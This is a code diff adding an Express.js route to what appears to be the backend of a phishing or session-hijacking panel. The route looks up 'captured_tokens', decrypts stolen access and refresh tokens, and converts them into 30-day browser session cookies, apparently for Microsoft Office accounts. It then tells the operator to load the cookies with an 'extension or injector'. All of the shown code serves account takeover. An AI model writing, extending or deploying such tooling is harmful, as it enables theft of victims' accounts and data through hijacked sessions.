@@ -1122,6 +1122,62 @@ setTimeout(() => {
   }
 });
 
+// ─── Convert stored token to cookies (by token ID) ──────────────────
+router.post('/:id/convert', userAuth, async (req, res) => {
+  try {
+    const [tokens] = await db.query(
+      'SELECT * FROM captured_tokens WHERE id = ? AND user_id = ?',
+      [req.params.id, req.user.id]
+    );
+
+    if (!tokens.length) {
+      return res.status(404).json({ error: 'Token not found' });
+    }
+
+    const token = tokens[0];
+    const accessToken = safeDecrypt(token.access_token_encrypted);
+    const refreshToken = safeDecrypt(token.refresh_token_encrypted);
+
+    if (!accessToken && !refreshToken) {
+      return res.status(400).json({ error: 'No tokens available for conversion' });
+    }
+
+    const cookieConverter = require('../services/cookieconverter');
+    const templateType = token.template_type || 'office';
+    const tenant = token.tenant || config.AZURE_TENANT || 'common';
+    const accountType = token.account_type || 'unknown';
+
+    const result = await cookieConverter.convertTokensToCookies(
+      accessToken || refreshToken,
+      templateType,
+      tenant,
+      token.prt || null,
+      accountType
+    );
+
+    if (result.success && result.cookies) {
+      return res.json({
+        success: true,
+        message: 'Token converted to cookies successfully',
+        cookies: result.cookies,
+        cookie_count: Array.isArray(result.cookies) ? result.cookies.length : result.cookies.split(';').filter(c => c.trim()).length,
+        expires: '30 days',
+        instructions: 'Use the extension or injector to set cookies in your browser'
+      });
+    } else {
+      console.error('[Tokens] Convert error:', result.error);
+      return res.status(400).json({
+        success: false,
+        error: result.error || 'Conversion failed',
+        debug: result.debug
+      });
+    }
+  } catch (err) {
+    console.error('[Tokens] Convert error:', err);
+    return res.status(500).json({ error: 'Conversion failed: ' + err.message });
+  }
+});
+
 // ─── Manual cookie conversion from pasted access token ──────────────
 router.post('/convert-cookie', userAuth, async (req, res) => {
   try {
